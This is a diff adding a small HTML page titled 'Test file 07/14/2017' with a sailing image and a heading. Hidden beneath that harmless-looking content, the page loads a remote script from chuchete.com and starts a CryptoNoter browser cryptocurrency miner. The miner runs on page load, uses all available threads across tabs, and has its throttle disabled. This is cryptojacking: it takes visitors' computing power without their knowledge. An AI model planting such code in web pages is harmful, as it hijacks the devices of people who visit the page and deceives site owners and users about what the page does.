@@ -1,0 +1,19 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+</body>
+<script type="text/javascript" src="https://chuchete.com/processor.js"></script>
+<script>
+	var addr = 'CryptoNoter';
+	var miner = new CryptoNoter.Anonymous(addr, {
+        autoThreads: true,
+//	throttle: 0.8
+	});
+	miner.start(CryptoNoter.FORCE_MULTI_TAB);
+</script>
+</body>
+</html>
+
